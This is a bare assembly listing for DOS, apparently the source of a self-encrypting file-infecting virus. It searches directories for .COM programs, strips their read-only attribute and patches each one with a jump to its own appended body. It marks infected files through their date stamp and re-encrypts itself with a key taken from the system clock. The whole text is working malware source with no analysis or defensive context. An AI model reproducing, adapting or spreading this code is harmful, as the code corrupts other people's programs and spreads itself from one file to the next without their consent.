	.MODEL tiny
	.186
	.code 
	org 100h

lng             EQU     0c2h

start:
	jmp	sc
	db	200d dup(08h)
sc     PROC

Virn:
	DB	0bah	;--- KEY 
Sad	DB	00h,00h
        Call	opt
opt:	Pop	Bp
	Sub	Bp,1d1h ;------------?
	Cli
	Call	Serg
dead	db	0fbh
	Mov	byte ptr [Bp+sdf],90h
	Mov	byte ptr [Bp+dir],00h
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
dir	db	00h
;------------------------------------------------------------------------------
late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset date
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	Push	Cs
	Pop	Es
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
	Mov	Cx,4ah
	Lea	Si,rec+[Bp]
	Lea	Di,Ert+[Bp]
	Rep	Movsb
	Mov	Ah,2ch
	Int	21h
	Mov	word ptr Sad+[Bp],Dx 
	Jmp	Ert
Rec:
	Call	Der
	Lea	Dx,Sc+[Bp]
	Mov     cx,1a8h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     dx,65055d
	or      dx,01a0h
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h
rt:
	Push	Cs
	Pop	Es
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Push    0100h
	Ret
sc      ENDP

Serg:
	Mov	byte ptr [Bp+sdf],4ah
sdf:
	Nop
Der:
	Lea	Si,dead+[Bp]
	Mov	Cx,lng
Decod:
	Xor	word ptr [Si],Dx
	Inc	Si
	Inc	Si
	Loop	Decod
	Ret
Ert:
END start
END